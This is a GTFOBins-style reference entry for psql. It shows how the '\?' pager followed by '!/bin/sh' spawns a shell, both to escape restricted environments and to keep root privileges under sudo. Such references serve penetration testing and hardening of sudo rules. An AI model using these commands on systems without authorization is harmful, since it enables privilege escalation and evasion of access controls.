# GTFOBin: psql

This invokes the default pager, which is likely to be `less`, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
psql
\?
!/bin/sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
psql
\?
!/bin/sh
```